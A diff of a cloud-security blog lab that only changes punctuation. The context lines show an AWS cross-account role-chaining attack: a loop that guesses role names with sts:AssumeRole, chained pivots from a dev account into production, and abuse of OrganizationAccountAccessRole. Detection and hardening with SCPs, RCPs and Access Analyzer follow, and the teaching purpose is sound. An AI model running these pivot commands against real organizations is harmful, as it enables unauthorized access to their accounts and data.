@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Lab — Cross-Account Role Chaining: One Compromised Account to Full Org Access"
+title: "Lab: Cross-Account Role Chaining: One Compromised Account to Full Org Access"
 date: 2026-07-02T10:00:00
 categories:
   - AWS Security Labs
@@ -16,7 +16,7 @@ tags:
   - cloud-attack
   - lab
 author: muhammed
-description: A hands-on lab demonstrating how a single compromised AWS account becomes a pivot point into an entire organization — using misconfigured trust policies, resource-based policy wildcards, and role chaining to move laterally across accounts — then stopped with SCPs, RCPs, and Access Analyzer.
+description: A hands-on lab demonstrating how a single compromised AWS account becomes a pivot point into an entire organization - using misconfigured trust policies, resource-based policy wildcards, and role chaining to move laterally across accounts - then stopped with SCPs, RCPs, and Access Analyzer.
 toc: true
 pin: false
 math: false
@@ -33,14 +33,14 @@ Detect the lateral movement with CloudTrail and GuardDuty.
 Stop it with SCPs and resource control policies.
 
 **Run this only in AWS accounts you own.**
-This lab works best with an AWS Organization — you can simulate it with two accounts minimum.
+This lab works best with an AWS Organization - you can simulate it with two accounts minimum.
 
 ---
 
 ## Why Cross-Account Attacks Are the Endgame
 
 Every lab so far has been within a single AWS account.
-In real organizations, accounts are segmented by environment, team, or function — dev, staging, prod, security, shared-services.
+In real organizations, accounts are segmented by environment, team, or function - dev, staging, prod, security, shared-services.
 The assumption is that a compromised dev account cannot reach prod.
 
 That assumption is wrong when:
@@ -56,15 +56,15 @@ This lab demonstrates how one credential in a dev account becomes full productio
 ## Attack Chain Overview
 
 ```
-Account A (dev) — attacker starts here with stolen credentials
+Account A (dev) - attacker starts here with stolen credentials
     │
     │  Step 1: Find roles that trust Account A broadly (not specific roles)
     ▼
-Account B (shared-services) — pivot via misconfigured trust
+Account B (shared-services) - pivot via misconfigured trust
     │
     │  Step 2: From shared-services, find roles in prod that trust shared-services
     ▼
-Account C (production) — lateral movement complete
+Account C (production) - lateral movement complete
     │
     │  Step 3: Enumerate production resources, exfiltrate data
     │  Step 4: Find if any resource policy uses Principal: * or trusts the org broadly
@@ -74,21 +74,21 @@ Full production data access
 
 ---
 
-## Lab Setup — Three-Account Organization
+## Lab Setup: Three-Account Organization
 
 ### Accounts
 
 | Account | Alias | Purpose |
 |---------|-------|---------|
-| 111111111111 | lab-dev | Development — attacker starts here |
-| 222222222222 | lab-shared | Shared services — pivot point |
-| 333333333333 | lab-prod | Production — target |
+| 111111111111 | lab-dev | Development - attacker starts here |
+| 222222222222 | lab-shared | Shared services - pivot point |
+| 333333333333 | lab-prod | Production - target |
 
 If you only have two accounts, use one as dev+shared and one as prod.
 
-### Step 0.1 — Set Up IAM Roles
+### Step 0.1: Set Up IAM Roles
 
-**In Account B (shared-services) — the misconfigured pivot role:**
+**In Account B (shared-services) - the misconfigured pivot role:**
 
 ```bash
 # Run this in Account B
@@ -132,7 +132,7 @@ aws iam put-role-policy \
   --profile account-b
 ```
 
-**In Account C (production) — the final target role:**
+**In Account C (production) - the final target role:**
 
 ```bash
 # Run this in Account C
@@ -166,7 +166,7 @@ aws iam attach-role-policy \
   --profile account-c
 ```
 
-**In Account A (dev) — the attacker's starting credentials:**
+**In Account A (dev) - the attacker's starting credentials:**
 
 ```bash
 # Attacker has a low-privilege IAM user in Account A
@@ -194,7 +194,7 @@ aws iam create-access-key \
 
 ---
 
-## Phase 1 — Enumerate from Account A
+## Phase 1: Enumerate from Account A
 
 Starting with the stolen `compromised-developer` credentials in Account A:
 
@@ -206,19 +206,19 @@ aws configure --profile attacker
 aws sts get-caller-identity --profile attacker
 # Account: 111111111111, User: compromised-developer
 
-# The attacker knows this is a dev account — look for cross-account roles
+# The attacker knows this is a dev account: look for cross-account roles
 # Real attackers use pacu's iam__enum_roles or targeted enumeration
 ```
 
 ### Enumerate Accessible Roles in Other Accounts
 
 ```bash
-# Try to list roles in Account B — will fail (no iam:ListRoles)
+# Try to list roles in Account B: will fail (no iam:ListRoles)
 aws iam list-roles --profile attacker
-# AccessDenied — but we don't need to list them
+# AccessDenied: but we don't need to list them
 
 # Brute-force common role names in other accounts using sts:AssumeRole
-# (common in pentests — try known role names)
+# (common in pentests: try known role names)
 for ROLE in "shared-services-role" "cross-account-role" "OrganizationAccountAccessRole" "deployment-role" "admin-role"; do
   aws sts assume-role \
     --role-arn "arn:aws:iam::222222222222:role/$ROLE" \
@@ -233,13 +233,13 @@ Output:
 FOUND: shared-services-role
 ```
 
-The role exists and its trust policy allows Account A's root — so any identity in Account A can assume it.
+The role exists and its trust policy allows Account A's root - so any identity in Account A can assume it.
 
-> 📸 **SCREENSHOT:** The loop output showing `FOUND: shared-services-role` — confirming the pivot role is accessible
+> 📸 **SCREENSHOT:** The loop output showing `FOUND: shared-services-role` - confirming the pivot role is accessible
 
 ---
 
-## Phase 2 — Pivot to Account B (Shared Services)
+## Phase 2: Pivot to Account B (Shared Services)
 
 ```bash
 # Assume the shared-services role
@@ -257,13 +257,13 @@ aws sts get-caller-identity
 # Account: 222222222222, Role: shared-services-role
 ```
 
-Now in Account B — enumerate what is visible:
+Now in Account B - enumerate what is visible:
 
 ```bash
-# Read-only access — see what prod resources are reachable
+# Read-only access: see what prod resources are reachable
 aws s3 ls                  # Lists buckets in Account B
 aws ec2 describe-instances # Lists EC2 instances in Account B
-aws iam list-roles         # Lists all roles in Account B — find further pivot targets
+aws iam list-roles         # Lists all roles in Account B - find further pivot targets
 
 # Look for roles that can assume into Account C
 aws iam list-roles | python3 -m json.tool | grep -A5 "333333333333"
@@ -273,10 +273,10 @@ aws iam list-roles | python3 -m json.tool | grep -A5 "333333333333"
 
 ---
 
-## Phase 3 — Pivot to Account C (Production)
+## Phase 3: Pivot to Account C (Production)
 
 ```bash
-# Chain the assumption — from Account B, assume the prod role in Account C
+# Chain the assumption: from Account B, assume the prod role in Account C
 PROD_CREDS=$(aws sts assume-role \
   --role-arn "arn:aws:iam::333333333333:role/prod-access-role" \
   --role-session-name attacker-prod-pivot)
@@ -290,7 +290,7 @@ aws sts get-caller-identity
 ```
 
 The attacker started in Account A with dev credentials.
-They are now operating in Account C (production) with no alerts from Account C's team — because the assume-role calls look like normal infrastructure automation.
+They are now operating in Account C (production) with no alerts from Account C's team - because the assume-role calls look like normal infrastructure automation.
 
 ```bash
 # Enumerate production resources
@@ -314,13 +314,13 @@ UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B
 Discovery:IAMUser/AnomalousBehavior
 ```
 
-The prod-access-role is being used from unusual IPs and making unusual API calls — GuardDuty fires on the behavior pattern.
+The prod-access-role is being used from unusual IPs and making unusual API calls - GuardDuty fires on the behavior pattern.
 
 ---
 
-## Phase 4 — Resource-Based Policy Wildcards
+## Phase 4: Resource-Based Policy Wildcards
 
-Independent of role chaining, some resources have policies that grant access to any principal — including principals in other accounts.
+Independent of role chaining, some resources have policies that grant access to any principal - including principals in other accounts.
 
 ### Find Resources with Wildcard Principals
 
@@ -344,7 +344,7 @@ or:
 }
 ```
 
-Any AWS account can access this resource — no role assumption needed.
+Any AWS account can access this resource - no role assumption needed.
 
 ### Other Resources to Check
 
@@ -366,7 +366,7 @@ aws sqs list-queues --query 'QueueUrls[]' --output text | \
   xargs -n1 aws sqs get-queue-attributes --attribute-names Policy --queue-url
 ```
 
-Use Access Analyzer to automate this — it finds all external access paths across every resource type:
+Use Access Analyzer to automate this - it finds all external access paths across every resource type:
 
 ```bash
 # Create an analyzer for the entire org
@@ -375,7 +375,7 @@ aws accessanalyzer create-analyzer \
   --type ORGANIZATION \
   --profile management-account
 
-# List all findings — every resource reachable from outside the org or account
+# List all findings: every resource reachable from outside the org or account
 aws accessanalyzer list-findings \
   --analyzer-arn arn:aws:accessanalyzer:eu-west-1:MGMT_ACCOUNT_ID:analyzer/org-external-access
 ```
@@ -384,10 +384,10 @@ aws accessanalyzer list-findings \
 
 ---
 
-## Phase 5 — OrganizationAccountAccessRole Abuse
+## Phase 5: OrganizationAccountAccessRole Abuse
 
 Every account in an AWS Organization created via Organizations console has a role called `OrganizationAccountAccessRole`.
-Its trust policy allows the management account to assume it — this is how AWS lets the management account access member accounts.
+Its trust policy allows the management account to assume it - this is how AWS lets the management account access member accounts.
 
 ```bash
 # If the attacker compromises the management account,
@@ -397,7 +397,7 @@ aws sts assume-role \
   --role-session-name org-takeover \
   --profile management-account
 
-# This gives AdministratorAccess in the target account — every account in the org
+# This gives AdministratorAccess in the target account: every account in the org
 ```
 
 This is why:
@@ -408,17 +408,17 @@ This is why:
 
 ---
 
-## Hardening — Four Layers That Stop This
+## Hardening: Four Layers That Stop This
 
-### Fix 1 — Specific Role ARNs in Trust Policies (Not `:root`)
+### Fix 1: Specific Role ARNs in Trust Policies (Not `:root`)
 
 ```bash
-# WRONG — trusts any identity in Account A
+# WRONG: trusts any identity in Account A
 {
   "Principal": {"AWS": "arn:aws:iam::111111111111:root"}
 }
 
-# RIGHT — trusts only a specific role in Account A
+# RIGHT: trusts only a specific role in Account A
 {
   "Principal": {"AWS": "arn:aws:iam::111111111111:role/specific-automation-role"}
 }
@@ -446,7 +446,7 @@ aws iam update-assume-role-policy \
   --profile account-b
 ```
 
-### Fix 2 — SCP to Restrict Who Can Assume Roles
+### Fix 2: SCP to Restrict Who Can Assume Roles
 
 ```json
 {
@@ -468,12 +468,12 @@ aws iam update-assume-role-policy \
 }
 ```
 
-Attach to all OUs except the management account — prevents any ad-hoc cross-account role assumptions.
+Attach to all OUs except the management account - prevents any ad-hoc cross-account role assumptions.
 
-### Fix 3 — RCP to Restrict Who Can Access Resources
+### Fix 3: RCP to Restrict Who Can Access Resources
 
 Resource Control Policies (RCPs) are like SCPs but applied to resources instead of principals.
-They restrict what any principal — even external ones — can do with resources in your org.
+They restrict what any principal - even external ones - can do with resources in your org.
 
 ```json
 {
@@ -496,7 +496,7 @@ They restrict what any principal — even external ones — can do with resource
 }
 ```
 
-This prevents any principal outside your organization from accessing S3 buckets — regardless of the bucket policy.
+This prevents any principal outside your organization from accessing S3 buckets - regardless of the bucket policy.
 
 ```bash
 # Apply the RCP to the root of your organization
@@ -511,7 +511,7 @@ aws organizations attach-policy \
   --target-id r-ROOT_ID
 ```
 
-### Fix 4 — CloudTrail Cross-Account Visibility
+### Fix 4: CloudTrail Cross-Account Visibility
 
 Set up centralized CloudTrail in an immutable logging account:
 
@@ -562,7 +562,7 @@ The same IP appearing across three accounts over a short window is the signature
 
 ---
 
-## Access Analyzer — Detect Before Exploitation
+## Access Analyzer: Detect Before Exploitation
 
 Access Analyzer scans all trust policies and resource policies in the org and flags any that grant access to external principals.
 
@@ -582,14 +582,14 @@ Expected findings for this lab:
 
 | Resource | External access | Finding type |
 |----------|----------------|--------------|
-| `shared-services-role` trust | Account A (`:root`) | ExternalAccess — role can be assumed from another account |
-| `prod-access-role` trust | Account B (`:root`) | ExternalAccess — role can be assumed from Account B |
+| `shared-services-role` trust | Account A (`:root`) | ExternalAccess - role can be assumed from another account |
+| `prod-access-role` trust | Account B (`:root`) | ExternalAccess - role can be assumed from Account B |
 
 > 📸 **SCREENSHOT:** Access Analyzer showing two external access findings for the cross-account roles with their trust policies
 
 ---
 
-## The Mental Model — Every Account Is a Blast Radius
+## The Mental Model: Every Account Is a Blast Radius
 
 ```
 Without cross-account protections:
@@ -635,11 +635,11 @@ aws accessanalyzer delete-analyzer --analyzer-name org-external-access --profile
 
 ## Key Takeaways
 
-- `arn:aws:iam::ACCOUNT_ID:root` in a trust policy means any identity in that account can assume the role — it is not just the root user; this is the most common cross-account misconfiguration
-- Role chaining leaves a clear trail in CloudTrail — the same source IP assuming roles across multiple accounts over a short time window is a reliable detection signal
-- SCPs restrict what accounts can DO — an SCP on the dev OU that blocks `sts:AssumeRole` to prod account ARNs stops lateral movement at the source
-- RCPs restrict what can be DONE TO your resources — an RCP requiring org membership means external principals cannot access your data even if a resource policy says otherwise
-- Access Analyzer at the org level surfaces every external trust path — run it continuously and treat any new external finding as a high-priority alert
+- `arn:aws:iam::ACCOUNT_ID:root` in a trust policy means any identity in that account can assume the role - it is not just the root user; this is the most common cross-account misconfiguration
+- Role chaining leaves a clear trail in CloudTrail - the same source IP assuming roles across multiple accounts over a short time window is a reliable detection signal
+- SCPs restrict what accounts can DO - an SCP on the dev OU that blocks `sts:AssumeRole` to prod account ARNs stops lateral movement at the source
+- RCPs restrict what can be DONE TO your resources - an RCP requiring org membership means external principals cannot access your data even if a resource policy says otherwise
+- Access Analyzer at the org level surfaces every external trust path - run it continuously and treat any new external finding as a high-priority alert
 
 ---
 
